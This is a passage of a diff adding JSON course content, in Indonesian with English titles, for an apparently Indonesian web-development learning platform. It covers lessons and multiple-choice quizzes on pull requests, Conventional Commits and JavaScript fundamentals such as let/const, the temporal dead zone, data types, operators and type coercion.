+            "question": "Apa fungsi utama dari Pull Request (PR) dalam kolaborasi tim pengembang di GitHub?",
+            "options": [
+              "Mengajukan perubahan kode dari sebuah branch fitur ke branch utama, memungkinkan anggota tim melakukan code review, diskusi, dan automated testing sebelum di-merge.",
+              "Menarik uang dari rekening bank developer.",
+              "Menghapus repository secara otomatis jika ada error.",
+              "Mengubah ekstensi file JavaScript menjadi TypeScript."
+            ],
+            "correctIndex": 0,
+            "explanation": "Pull Request adalah pusat kolaborasi dan quality control di mana tim meninjau arsitektur kode, memeriksa bug, dan menyetujui integrasi fitur baru."
+          },
+          {
+            "id": "q-6-5-2",
+            "question": "Berdasarkan standar Conventional Commits, format pesan commit manakah yang paling benar untuk penambahan fitur baru integrasi login Google?",
+            "options": [
+              "feat(auth): add google oauth2 login integration",
+              "update kodenya bro",
+              "fix: yesterday login changes",
+              "COMMIT NUMBER 5 COMPLETED"
+            ],
+            "correctIndex": 0,
+            "explanation": "Conventional Commits menggunakan format standar <type>(<scope>): <description> seperti feat: untuk penambahan fitur baru."
+          },
+          {
+            "id": "q-6-5-3",
+            "question": "Manakah prefix commit type yang tepat digunakan jika Anda memperbaiki bug kerusakan tampilan layout pada formulir pendaftaran?",
+            "options": [
+              "fix(signup): fix responsive layout overflow on mobile",
+              "feat(signup): layout",
+              "style(all): do nothing",
+              "chore: css done"
+            ],
+            "correctIndex": 0,
+            "explanation": "Tipe fix: digunakan secara eksplisit untuk perbaikan bug dan penanganan error pada sistem yang sudah ada."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-7",
+    "orderIndex": 7,
+    "titleId": "JavaScript Fundamentals: Variabel, Tipe Data & Operator",
+    "titleEn": "JavaScript Fundamentals: Variables, Data Types & Operators",
+    "category": "Frontend",
+    "description": "Fondasi bahasa JavaScript modern: deklarasi variabel (let vs const), tipe data primitif vs referensi, operator logika, type coercion, string manipulation, array, dan object destructuring.",
+    "descriptionEn": "Modern JavaScript foundations: variables (let vs const), primitive vs reference types, operators, type coercion, strings, arrays, and object destructuring.",
+    "lessons": [
+      {
+        "id": "lesson-7-1",
+        "stageId": "stage-7",
+        "slug": "variabel-var-let-const-dan-tdz",
+        "title": "Variabel: var vs let vs const & Temporal Dead Zone",
+        "titleEn": "Variables: var vs let vs const & TDZ",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memahami scope variabel (function scope vs block scope), mengapa var ditinggalkan, let vs const, dan Temporal Dead Zone (TDZ).",
+        "prerequisites": [
+          "pull-request-dan-conventional-commits"
+        ],
+        "learningObjectives": [
+          "Membedakan sifat dan ruang lingkup (scope) antara var (function-scoped) dengan let/const (block-scoped).",
+          "Menerapkan prinsip 'const by default, let when needed' dalam penulisan variabel modern.",
+          "Menjelaskan fenomena Temporal Dead Zone (TDZ) yang memicu ReferenceError pada let dan const.",
+          "Memahami bahwa const mengunci pengikatan identifier (reassignment), bukan mutasi internal objek."
+        ],
+        "whyMatters": "Deklarasi variabel yang keliru adalah sumber bug kebocoran scope paling umum pada kode JavaScript lawas.",
+        "careerContext": "Standar kode modern (ESLint rules) secara ketat melarang penggunaan kata kunci `var`.",
+        "commonMistakes": [
+          "Mengira bahwa properti di dalam objek yang dideklarasikan dengan `const` tidak bisa diubah (const melarang re-assignment variabel, bukan mutasi properti objek).",
+          "Mengakses variabel `let` sebelum baris deklarasinya dan bingung mengapa muncul error TDZ."
+        ],
+        "keyTerms": [
+          {
+            "term": "const",
+            "definition": "Deklarasi variabel konstan block-scoped yang tidak dapat di-reassign (diberi nilai baru)."
+          },
+          {
+            "term": "let",
+            "definition": "Deklarasi variabel block-scoped yang nilainya dapat diubah/di-reassign sewaktu-waktu."
+          },
+          {
+            "term": "Block Scope",
+            "definition": "Cakupan variabel yang dibatasi oleh sepasang kurung kurawal `{ ... }`."
+          },
+          {
+            "term": "Temporal Dead Zone (TDZ)",
+            "definition": "Zona waktu antara awal scope hingga baris deklarasi di mana variabel let/const belum dapat diakses."
+          }
+        ],
+        "contentMd": "# Variabel: var vs let vs const & Temporal Dead Zone\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara mendeklarasikan data menggunakan kata kunci modern **`const`** dan **`let`**, alasan mengapa **`var`** ditinggalkan, konsep **Block Scope**, serta fenomena **Temporal Dead Zone (TDZ)**.\n\n## Mengapa Konsep Ini Penting?\nVariabel adalah wadah penyimpanan data di memori komputer. Memilih deklarasi yang tepat mencegah variabel bocor ke luar fungsi (*scope leakage*) dan melindungi data dari perubahan yang tidak disengaja.\n\n## 1. Perbandingan `var` vs `let` vs `const`\n\n| Karakteristik | `var` (Kuno / Hindari) | `let` (Modern) | `const` (Modern) |\n| :--- | :--- | :--- | :--- |\n| **Scope** | Function Scope | **Block Scope `{ }`** | **Block Scope `{ }`** |\n| **Reassign (Nilai Baru)** | Boleh | **Boleh** | **TIDAK Boleh** |\n| **Redeclare (Nama Sama)**| Boleh (Berbahaya!) | Dilarang | Dilarang |\n| **Hoisting & TDZ** | Di-hoist (`undefined`) | **Terikat TDZ** | **Terikat TDZ** |\n\n## 2. Aturan Emas: \"Const by default, let when needed\"\n- Selalu gunakan **`const`** sebagai pilihan utama untuk semua variabel.\n- Hanya gunakan **`let`** jika Anda tahu pasti nilai variabel tersebut akan diubah nilainya (misal: hitungan counter loop atau status loading).\n- **Jangan pernah gunakan `var`** dalam proyek modern.\n\n```javascript\nconst namaPlatform = \"BelajarinAja\"; // Nilai tidak akan pernah berubah\nlet jumlahKlik = 0;                  // Nilai akan bertambah saat diklik\n\njumlahKlik = jumlahKlik + 1; // VALID\n// namaPlatform = \"Lain\";    // ERROR: TypeError: Assignment to constant variable\n```\n\n## 3. Catatan Penting: Mutasi Objek pada `const`\n`const` mengunci **referensi variabel**, bukan isi data internal objek atau array:\n\n```javascript\nconst pengguna = { nama: \"Acelino\", peran: \"Developer\" };\n\n// VALID: Mengubah properti internal diperbolehkan\npengguna.nama = \"Marchelino\"; \n\n// ERROR: Mengganti objek utuh dengan objek baru dilarang\n// pengguna = { nama: \"Budi\" }; // TypeError!\n```\n\n## 4. Mengenal Temporal Dead Zone (TDZ)\nPada variabel `let` dan `const`, Anda **TIDAK BISA** memanggil variabel sebelum baris deklarasinya ditulis:\n\n```javascript\nconsole.log(skor); // ERROR: ReferenceError: Cannot access 'skor' before initialization\nlet skor = 100;\n```\nZona antara awal blok kode hingga baris `let skor = 100` disebut sebagai **Temporal Dead Zone**. Ini adalah fitur keamanan JavaScript modern agar developer tidak membaca variabel yang belum siap.\n\n## Kesalahan Umum Pemula\n- **Memakai let untuk semua hal**: Menggunakan `let` padahal nilainya tidak pernah diubah membuat niat kode (*code intent*) tidak jelas bagi developer lain.\n\n## Praktik Mandiri\n1. Deklarasikan array `const hobi = ['coding', 'desain']`.\n2. Tambahkan hobi baru dengan `hobi.push('musik')` dan buktikan bahwa mutasi array pada const berhasil tanpa error.\n\n## Ringkasan\n- Gunakan **`const`** secara default, dan gunakan **`let`** hanya saat butuh re-assignment.\n- **`let`** dan **`const`** bersifat **Block Scoped** (terisolasi di dalam kurung kurawal `{ }`).\n- **Temporal Dead Zone (TDZ)** melarang akses variabel sebelum baris inisialisasinya.\n- `const` melarang re-assignment variabel, namun properti objek/array di dalamnya tetap dapat dimutasi.",
+        "quizzes": [
+          {
+            "id": "q-7-1-1",
+            "question": "Apa perbedaan paling mendasar antara deklarasi variabel menggunakan const dan let?",
+            "options": [
+              "Variabel yang dideklarasikan dengan const tidak dapat di-reassign (diberi nilai baru), sedangkan variabel let dapat diubah nilainya.",
+              "const hanya untuk angka sedangkan let hanya untuk string teks.",
+              "let dieksekusi lebih lambat daripada const.",
+              "const bersifat global sedangkan let tidak bisa digunakan di dalam fungsi."
+            ],
+            "correctIndex": 0,
+            "explanation": "const menciptakan immutable binding pada identifier variabel (tidak bisa di-reassign), sedangkan let mengizinkan reassignment nilai baru."
+          },
+          {
+            "id": "q-7-1-2",
+            "question": "Apa yang dimaksud dengan fenomena Temporal Dead Zone (TDZ) pada variabel let dan const di JavaScript?",
+            "options": [
+              "Periode waktu di mana variabel sudah berada di dalam scope tetapi belum mencapai baris inisialisasinya, sehingga mengaksesnya sebelum baris deklarasi akan melempar ReferenceError.",
+              "Waktu jeda saat koneksi internet lambat.",
+              "Zona memori yang otomatis dihapus setiap 5 detik.",
+              "Kondisi saat browser mengalami freeze."
+            ],
+            "correctIndex": 0,
+            "explanation": "TDZ mencegah akses variabel let/const sebelum baris deklarasi dieksekusi, melindungi kode dari penggunaan nilai yang belum terdefinisi."
+          },
+          {
+            "id": "q-7-1-3",
+            "question": "Perhatikan kode berikut:\nconst user = { name: 'Acelino' };\nuser.name = 'Marchelino';\nApa yang terjadi saat kode tersebut dijalankan?",
+            "options": [
+              "Properti user.name berhasil diubah menjadi 'Marchelino' tanpa melempar error.",
+              "JavaScript melempar error TypeError: Assignment to constant variable.",
+              "Objek user otomatis terhapus dari memori komputer.",
+              "Nilai user.name tetap 'Acelino' tanpa ada pesan error."
+            ],
+            "correctIndex": 0,
+            "explanation": "const mengunci referensi pengikatan variabel, bukan isi mutasi internal properti objek tersebut."
+          }
+        ]
+      },
+      {
+        "id": "lesson-7-2",
+        "stageId": "stage-7",
+        "slug": "tipe-data-primitif-vs-referensi",
+        "title": "Tipe Data Primitif vs Tipe Data Referensi",
+        "titleEn": "Primitive vs Reference Data Types",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Mengenal 7 tipe data primitif (string, number, boolean, null, undefined, symbol, bigint) vs tipe data referensi (Object, Array, Function) dan alokasi memori (Stack vs Heap).",
+        "prerequisites": [
+          "variabel-var-let-const-dan-tdz"
+        ],
+        "learningObjectives": [
+          "Mengidentifikasi 7 tipe data primitif di JavaScript.",
+          "Membedakan penyimpanan memori Pass-by-Value (Stack) pada primitif vs Pass-by-Reference (Heap) pada objek/array.",
+          "Menganalisis dampak mutasi objek referensi yang saling terikat variabelnya.",
+          "Memahami anomali sejarah typeof null === 'object'."
+        ],
+        "whyMatters": "Memahami pass-by-reference mencegah bug mutasi state tak terduga yang sangat krusial saat bekerja dengan React state immutability.",
+        "careerContext": "Pertanyaan seputar Pass-by-Value vs Pass-by-Reference adalah materi wawancara kerja teknis paling klasik di dunia JavaScript.",
+        "commonMistakes": [
+          "Mengira menyalin objek dengan `let b = a` membuat objek baru independen (keduanya memegang alamat memori yang sama).",
+          "Bingung membedakan antara `undefined` (variabel belum diisi nilai) dan `null` (sengaja dikosongkan secara eksplisit)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Primitive Types",
+            "definition": "Tipe data sederhana yang menyimpan nilai aktual langsung di Stack memory (immutable value)."
+          },
+          {
+            "term": "Reference Types",
+            "definition": "Tipe data kompleks (Object, Array, Function) yang menyimpan alamat penunjuk memori ke objek di Heap."
+          },
+          {
+            "term": "Pass-by-Value",
+            "definition": "Penyalinan nilai data murni yang independen satu sama lain."
+          },
+          {
+            "term": "Pass-by-Reference",
+            "definition": "Penyalinan alamat memori sehingga kedua variabel menunjuk ke objek fisik yang sama."
+          }
+        ],
+        "contentMd": "# Tipe Data Primitif vs Tipe Data Referensi\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari sistem tipe data di JavaScript: **7 Tipe Data Primitif**, **Tipe Data Referensi**, serta bagaimana perbedaan alokasi memori (**Stack vs Heap**) memengaruhi cara variabel disalin dan dimutasi.\n\n## Mengapa Konsep Ini Penting?\nPernahkah Anda mengubah isi array `b`, tetapi array `a` tiba-tiba ikut berubah sendiri secara misterius? Hal ini terjadi karena Array adalah tipe data referensi. Memahami perbedaan ini adalah pondasi wajib sebelum menguasai Immutability di React.\n\n## 1. Tujuh Tipe Data Primitif (Pass-by-Value)\nTipe primitif menyimpan nilai aktual secara langsung di **Stack Memory**. Tipe primitif bersifat *immutable* (nilainya tidak bisa dimutasi secara internal, hanya bisa diganti nilainya):\n\n1. **`string`**: Teks (contoh: `\"BelajarinAja\"`).\n2. **`number`**: Angka bulat dan desimal (contoh: `42`, `3.14`).\n3. **`boolean`**: Logika kebenaran (`true` atau `false`).\n4. **`null`**: Nilai kosong yang sengaja diisi eksplisit oleh developer (*intentional absence of value*).\n5. **`undefined`**: Nilai default variabel yang sudah dideklarasikan tetapi belum diberi nilai.\n6. **`bigint`**: Angka integer raksasa melebihi batas $2^{53} - 1$ (contoh: `9007199254740991n`).\n7. **`symbol`**: Identifier unik yang dijamin tidak akan pernah kembar.\n\n### Karakteristik Pass-by-Value:\n```javascript\nlet x = 10;\nlet y = x; // y menyalin NILAI 10 secara independen\ny = 20;\n\nconsole.log(x); // Tetap 10 (x TIDAK terpengaruh oleh perubahan y)\n```\n\n## 2. Tipe Data Referensi (Pass-by-Reference)\nObjek, Array, dan Fungsi adalah **Reference Types**. Datanya disimpan di **Heap Memory**, sedangkan variabelnya hanya memegang **alamat penunjuk memori (*memory pointer/reference*)**.\n\n```javascript\nlet user1 = { nama: \"Acelino\" };\nlet user2 = user1; // user2 menyalin ALAMAT MEMORI yang sama!\n\nuser2.nama = \"Budi\";\n\nconsole.log(user1.nama); // \"Budi\" -> user1 IKUT BERUBAH karena menunjuk ke objek yang sama!\n```\n\n## 3. Anomali Khusus: `typeof null`\nDi JavaScript:\n```javascript\nconsole.log(typeof null); // \"object\"\n```\n> **Catatan Sejarah**: Hasil `\"object\"` adalah bug warisan dari implementasi awal JavaScript tahun 1995 yang tetap dipertahankan hingga kini demi menjaga kompatibilitas website-website kuno di dunia. `null` secara resmi tetaplah tipe data primitif.\n\n## Kesalahan Umum Pemula\n- **Menyamakan null dan undefined**: `undefined` berarti sistem belum tahu nilainya, sedangkan `null` berarti developer secara sadar mengosongkan nilainya.\n\n## Praktik Mandiri\n1. Buat array `let daftar1 = [1, 2, 3]` dan `let daftar2 = daftar1`.\n2. Jalankan `daftar2.push(4)` dan cetak `daftar1` di console untuk membuktikan sifat pass-by-reference.\n\n## Ringkasan\n- **Primitif** (string, number, boolean, null, undefined, symbol, bigint) disimpan secara **Pass-by-Value** di Stack memory.\n- **Referensi** (Object, Array, Function) disimpan secara **Pass-by-Reference** di Heap memory.\n- Mengubah properti pada variabel referensi salinan akan mengubah objek aslinya.",
+        "quizzes": [
+          {
+            "id": "q-7-2-1",
+            "question": "Manakah di antara pilihan berikut yang SEMUANYA merupakan tipe data primitif di JavaScript?",
+            "options": [
+              "string, number, boolean, null, undefined, symbol, bigint",
+              "array, object, function, class",
+              "integer, float, double, char",
+              "json, xml, dom, event"
+            ],
+            "correctIndex": 0,
+            "explanation": "JavaScript memiliki 7 tipe data primitif standar: string, number, boolean, null, undefined, symbol, dan bigint."
+          },
+          {
+            "id": "q-7-2-2",
+            "question": "Perhatikan kode berikut:\nlet a = [1, 2, 3];\nlet b = a;\nb.push(4);\nconsole.log(a.length);\nBerapa nilai a.length yang dicetak di console?",
+            "options": [
+              "4",
+              "3",
+              "undefined",
+              "Error"
+            ],
+            "correctIndex": 0,
+            "explanation": "Array adalah tipe data referensi. Variabel a dan b menunjuk ke alamat memori yang sama di Heap, sehingga mutasi pada b langsung mengubah a."
+          },
+          {
+            "id": "q-7-2-3",
+            "question": "Apa hasil dari evaluasi typeof null di JavaScript?",
+            "options": [
+              "'object' (anomali sejarah awal JavaScript)",
+              "'null'",
+              "'undefined'",
+              "'boolean'"
+            ],
+            "correctIndex": 0,
+            "explanation": "typeof null menghasilkan string 'object' akibat keputusan representasi biner pada engine JS awal 1995 yang dipertahankan untuk backward compatibility."
+          }
+        ]
+      },
+      {
+        "id": "lesson-7-3",
+        "stageId": "stage-7",
+        "slug": "operator-aritmatika-perbandingan-dan-logika",
+        "title": "Operator Aritmatika, Perbandingan & Logika (===, ??, ?.)",
+        "titleEn": "Arithmetic, Comparison & Logical Operators",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memahami operator aritmatika, perbandingan ketat (=== vs ==), operator logika (&&, ||), short-circuit evaluation, dan Nullish Coalescing (??).",
+        "prerequisites": [
+          "tipe-data-primitif-vs-referensi"
+        ],
+        "learningObjectives": [
+          "Membedakan perbandingan ketat (===) dengan perbandingan longgar (==).",
+          "Menerapkan evaluasi Short-Circuit pada operator logika && dan ||.",
+          "Membedakan fungsi Nullish Coalescing (??) dengan Logical OR (||) saat menangani angka 0 dan string kosong."
+        ],
+        "whyMatters": "Menggunakan perbandingan longgar `==` dapat memicu bug tak terduga akibat type coercion implisit (contoh: `0 == ''` bernilai true).",
+        "careerContext": "Semua linter profesional mewajibkan penggunaan strict equality `===` di seluruh basis kode.",
+        "commonMistakes": [
+          "Menggunakan `||` untuk nilai fallback angka yang menyebabkan nilai `0` dianggap false dan tertimpa fallback.",
+          "Mengira `5 + '5'` menghasilkan 10 (sebenarnya menghasilkan string `'55'`)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Strict Equality (===)",
+            "definition": "Perbandingan yang memeriksa kesamaan nilai DAN tipe data tanpa konversi otomatis."
+          },
+          {
+            "term": "Short-Circuit Evaluation",
+            "definition": "Penghentian evaluasi logika segera setelah hasil kepastian didapatkan."
+          },
+          {
+            "term": "Nullish Coalescing (??)",
+            "definition": "Operator yang hanya mengembalikan fallback jika nilai sebelah kiri adalah `null` atau `undefined`."
+          }
+        ],
+        "contentMd": "# Operator Aritmatika, Perbandingan & Logika (===, ??, ?.)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara melakukan perhitungan dan evaluasi kondisi di JavaScript menggunakan **operator aritmatika**, **perbandingan ketat (`===`)**, evaluasi **Short-Circuit**, serta operator modern **Nullish Coalescing (`??`)**.\n\n## Mengapa Konsep Ini Penting?\nJavaScript memiliki perilaku unik saat membandingkan data. Memahami aturan perbandingan yang ketat mencegah bug tersembunyi yang sering membingungkan developer pemula.\n\n## 1. Perbandingan Ketat (`===`) vs Longgar (`==`)\n- **`===` (Strict Equality - WAJIB DIGUNAKAN)**: Membandingkan nilai dan tipe data secara ketat tanpa melakukan konversi otomatis.\n- **`==` (Loose Equality - HINDARI)**: Melakukan konversi tipe data otomatis (*Type Coercion*) sebelum membandingkan, yang sering menghasilkan logika janggal.\n\n```javascript\nconsole.log(5 === \"5\"); // false (Tipe number vs string berbeda -> AMAN)\nconsole.log(5 == \"5\");  // true (String \"5\" dikonversi paksa jadi number -> RAWAN BUG!)\nconsole.log(0 == \"\");   // true (Mengejutkan & rawan bug!)\n```\n\n## 2. Short-Circuit Evaluation pada `&&` dan `||`\n- **`A && B` (Logical AND)**: Jika `A` bernilai *falsy*, evaluasi langsung berhenti dan mengembalikan `A`. Jika `A` truthy, ia mengembalikan `B`.\n- **`A || B` (Logical OR)**: Jika `A` bernilai *truthy*, evaluasi langsung mengembalikan `A`. Jika `A` falsy, ia mengembalikan `B` (sebagai fallback).\n\n## 3. Penyelamat Nilai 0: Nullish Coalescing (`??`)\nOperator `||` menganggap angka `0`, string kosong `\"\"`, dan `false` sebagai nilai palsu. Jika Anda ingin memberikan fallback **HANYA** saat nilai benar-benar `null` atau `undefined`, gunakan **`??`**:\n\n```javascript\nconst sisaPercobaan = 0; // 0 adalah angka yang valid!\n\n// Masalah dengan || :\nconst hasilOR = sisaPercobaan || 3; // Menghasilkan 3 (SALAH: 0 dianggap falsy!)\n\n// Solusi dengan ?? :\nconst hasilNullish = sisaPercobaan ?? 3; // Menghasilkan 0 (BENAR: 0 dipertahankan!)\n```\n\n## Kesalahan Umum Pemula\n- **Memakai operator `+` dengan string**: `5 + \"2\"` menghasilkan `\"52\"` (konkatenasi teks), sedangkan `5 - \"2\"` menghasilkan angka `3`.\n\n## Praktik Mandiri\n1. Uji di console browser: bandingkan `false === 0` vs `false == 0`.\n2. Buat variabel `const skor = 0` dan buktikan perbedaan hasil `skor || 100` vs `skor ?? 100`.\n\n## Ringkasan\n- Selalu gunakan **`===` (Strict Equality)** untuk perbandingan aman.\n- Gunakan **`??` (Nullish Coalescing)** saat nilai `0` atau `\"\"` adalah nilai data yang sah dan tidak boleh tertimpa fallback.",
+        "quizzes": [
+          {
+            "id": "q-7-3-1",
+            "question": "Apa perbedaan antara operator kesetaraan ketat (===) dan kesetaraan longgar (==)?",
+            "options": [
+              "=== membandingkan nilai dan tipe data tanpa konversi otomatis, sedangkan == melakukan konversi tipe data otomatis sebelum membandingkan.",
+              "== lebih aman daripada ===",
+              "=== hanya untuk angka",
+              "Tidak ada perbedaan sama sekali"
+            ],
+            "correctIndex": 0,
+            "explanation": "Strict equality === tidak melakukan type coercion implisit, sehingga perbandingan tipe berbeda (seperti 5 === '5') bernilai false dengan aman."
+          },
+          {
+            "id": "q-7-3-2",
+            "question": "Berapa hasil evaluasi dari ekspresi: 5 + '5' dan 5 - '2' di JavaScript?",
+            "options": [
+              "'55' (string) dan 3 (number)",
+              "10 (number) dan 3 (number)",
+              "'55' (string) dan '3' (string)",
+              "NaN dan NaN"
+            ],
+            "correctIndex": 0,
+            "explanation": "Operator + melakukan penggabungan (concatenation) jika ada operand string, sedangkan operator - selalu memicu konversi numerik."
+          },
+          {
+            "id": "q-7-3-3",
+            "question": "Apa keunggulan operator Nullish Coalescing (??) dibandingkan Logical OR (||) saat menangani variabel bernilai angka 0?",
+            "options": [
+              "?? mempertahankan angka 0 karena hanya mengembalikan fallback jika nilai bernilai null atau undefined, sedangkan || menimpa angka 0.",
+              "?? mengubah angka 0 menjadi 100.",
+              "?? hanya bisa digunakan pada array.",
+              "Keduanya menghasilkan output yang sama persis."
+            ],
+            "correctIndex": 0,
+            "explanation": "Nullish Coalescing ?? menganggap 0 sebagai nilai valid yang bukan nullish (bukan null/undefined), sehingga fallback tidak akan dipicu."
+          }
+        ]
+      },
+      {
+        "id": "lesson-7-4",
+        "stageId": "stage-7",
+        "slug": "type-coercion-vs-explicit-conversion",
+        "title": "Type Coercion vs Explicit Conversion (Truthy & Falsy)",
+        "titleEn": "Type Coercion vs Explicit Conversion",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memahami 8 nilai Falsy di JavaScript, konversi tipe eksplisit (Number, String, Boolean), dan bahaya konversi implisit (Type Coercion).",
+        "prerequisites": [
+          "operator-aritmatika-perbandingan-dan-logika"
+        ],
+        "learningObjectives": [
+          "Menghafal 8 nilai Falsy di JavaScript (false, 0, -0, 0n, \"\", null, undefined, NaN).",
+          "Menjelaskan bahwa array kosong [] dan objek kosong {} adalah Truthy.",
+          "Mengeksekusi konversi tipe eksplisit (Number(), String(), Boolean()) dengan aman.",
+          "Memeriksa nilai NaN menggunakan Number.isNaN()."
+        ],
+        "whyMatters": "Memahami Truthy/Falsy adalah fondasi conditional rendering di React (contoh: `{items.length > 0 && <List />}`).",
+        "careerContext": "Menghindari type coercion tak terduga adalah prinsip utama dalam clean code TypeScript/JavaScript.",
+        "commonMistakes": [
+          "Mengira array kosong `[]` adalah falsy (semua objek/array di JavaScript adalah Truthy!).",
+          "Memeriksa NaN dengan `val === NaN` (karena `NaN !== NaN`, wajib gunakan `Number.isNaN()`)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Type Coercion",
+            "definition": "Konversi tipe data yang dilakukan secara otomatis/implisit oleh JavaScript engine di balik layar."
+          },
+          {
+            "term": "Explicit Conversion",
+            "definition": "Konversi tipe data yang ditulis secara sengaja dan jelas oleh developer menggunakan fungsi bawaan (Number(), String())."
+          },
+          {
+            "term": "Falsy Values",
+            "definition": "Nilai yang jika dikonversi ke tipe boolean akan dievaluasi sebagai `false`."
+          }
+        ],
+        "contentMd": "# Type Coercion vs Explicit Conversion (Truthy & Falsy)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari daftar lengkap **8 Nilai Falsy** di JavaScript, cara melakukan **konversi tipe data eksplisit**, serta bahaya jebakan konversi otomatis (**Type Coercion**).\n\n## Mengapa Konsep Ini Penting?\nDi JavaScript, setiap nilai dapat dievaluasi dalam konteks percabangan logika. Jika Anda tidak tahu apakah sebuah array kosong `[]` bernilai benar atau salah, kode percabangan Anda akan menghasilkan bug yang sulit dideteksi.\n\n## 1. Delapan (8) Nilai FALSY di JavaScript\nDi seluruh semesta JavaScript, hanya ada **8 nilai** yang jika diubah menjadi boolean akan menghasilkan `false`:\n\n1. `false`\n2. `0` (angka nol)\n3. `-0` (nol negatif)\n4. `0n` (BigInt nol)\n5. `\"\"` (string kosong)\n6. `null`\n7. `undefined`\n8. `NaN` (Not a Number)\n\n> **Poin Kritis**: Semua nilai SELAIN 8 nilai di atas adalah **TRUTHY**!  \n> Artinya: array kosong `[]` adalah **Truthy**, objek kosong `{}` adalah **Truthy**, dan string berisi spasi `\" \"` adalah **Truthy**.\n\n## 2. Konversi Tipe Eksplisit (Standar Bersih)\nSelalu gunakan konversi eksplisit yang jelas:\n\n```javascript\n// 1. Ke Tipe Number\nconst angka = Number(\"42\"); // 42\nconst desimal = parseFloat(\"3.14\");\n\n// 2. Ke Tipe String\nconst teks = String(100);   // \"100\"\nconst teks2 = (100).toString();\n\n// 3. Ke Tipe Boolean\nconst valid = Boolean(\"Halo\"); // true\nconst tidakValid = Boolean(0); // false\n```\n\n## 3. Memeriksa Nilai NaN (Not-a-Number)\nKarena `NaN` adalah satu-satunya nilai di JavaScript yang tidak sama dengan dirinya sendiri (`NaN !== NaN`), Anda **WAJIB** menggunakan fungsi khusus:\n\n```javascript\nconst hasilRusak = Number(\"bukan-angka\"); // menghasilkan NaN\n\n// CARA SALAH:\n// if (hasilRusak === NaN) // TIDAK AKAN PERNAH TERJADI!\n\n// CARA BENAR:\nif (Number.isNaN(hasilRusak)) {\n  console.log(\"Input bukan angka yang valid!\");\n}\n```\n\n## Kesalahan Umum Pemula\n- **Memakai if (array) untuk cek array kosong**: Karena `[]` adalah truthy, `if ([])` akan selalu dieksekusi. Gunakan `if (array.length > 0)` untuk memeriksa isi array.\n\n## Praktik Mandiri\n1. Uji di console: `Boolean([])`, `Boolean({})`, `Boolean(\"\")`, `Boolean(0)`.\n2. Amati mengapa `Boolean([])` bernilai true.\n\n## Ringkasan\n- Ada 8 nilai **Falsy**: `false`, `0`, `-0`, `0n`, `\"\"`, `null`, `undefined`, `NaN`.\n- Array kosong `[]` dan Objek kosong `{}` adalah **Truthy**.\n- Selalu lakukan konversi eksplisit dengan **`Number()`**, **`String()`**, atau **`Boolean()`**.\n- Periksa NaN hanya dengan **`Number.isNaN()`**.",
+        "quizzes": [
+          {
+            "id": "q-7-4-1",
+            "question": "Manakah cara konversi eksplisit yang paling bersih dan disarankan untuk mengubah string '42' menjadi tipe angka (number)?",
+            "options": [
+              "Number('42')",
+              "String('42')",
+              "Boolean('42')",
+              "'42'.toNumber()"
+            ],
+            "correctIndex": 0,
+            "explanation": "Fungsi bawaan Number('42') adalah metode eksplisit standar ECMAScript untuk konversi ke tipe number."
+          },
+          {
+            "id": "q-7-4-2",
+            "question": "Apa hasil konversi nilai-nilai berikut ke tipe Boolean: Boolean(0), Boolean(''), Boolean([]), Boolean({})?",
+            "options": [
+              "false, false, true, true",
+              "false, false, false, false",
+              "true, true, true, true",
+              "false, true, false, true"
+            ],
+            "correctIndex": 0,
+            "explanation": "0 dan '' adalah Falsy, sedangkan array kosong [] dan objek kosong {} adalah Truthy karena merupakan objek referensi yang eksis di memori."
+          },
+          {
+            "id": "q-7-4-3",
+            "question": "Bagaimana cara yang benar untuk memeriksa apakah sebuah variabel bernilai NaN di JavaScript?",
+            "options": [
+              "Number.isNaN(variabel)",
+              "variabel === NaN",
+              "typeof variabel === 'nan'",
+              "variabel.isNan()"
+            ],
+            "correctIndex": 0,
+            "explanation": "Karena sifat unik di mana NaN !== NaN, standar JavaScript mewajibkan penggunaan fungsi Number.isNaN(val)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-7-5",
+        "stageId": "stage-7",
+        "slug": "string-manipulation-dan-template-literals",
+        "title": "String Manipulation & Template Literals",
+        "titleEn": "String Manipulation & Template Literals",
+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Memanipulasi teks dengan method modern (includes, startsWith, slice, trim, replace, toLowerCase) dan interpolasi template literals backtick.",
+        "prerequisites": [
+          "type-coercion-vs-explicit-conversion"
+        ],
+        "learningObjectives": [
+          "Menerapkan interpolasi variabel dan multi-baris string menggunakan Template Literals backtick (``).",
+          "Menggunakan method pencarian substring modern: includes(), startsWith(), endsWith().",
+          "Membersihkan spasi kosong dan memformat teks menggunakan trim(), toLowerCase(), dan replaceAll()."
+        ],
+        "whyMatters": "Pengolahan teks (seperti sanitasi input formulir, pencarian filter nama, dan perakitan pesan dinamis) adalah tugas harian web developer.",
+        "careerContext": "Template literals adalah sintaks dasar pembuatan komponen dinamis di React JSX dan styling Tailwind.",
+        "commonMistakes": [
+          "Menggabungkan string dengan tanda tambah `+` yang berantakan alih-alih menggunakan template literals `${...}`.",
+          "Lupa bahwa string di JavaScript bersifat immutable (method string mengembalikan string baru, bukan mengubah aslinya)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Template Literals",
+            "definition": "Sintaks string bertanda backtick (``) yang mendukung interpolasi ekspresi `${}` dan teks multi-baris."
+          },
+          {
+            "term": "Immutable String",
+            "definition": "Sifat teks di mana karakternya tidak dapat diubah di tempat, setiap operasi menghasilkan salinan baru."
+          },
+          {
+            "term": "trim()",
+            "definition": "Method untuk membuang spasi kosong di awal dan akhir string."
+          }
+        ],
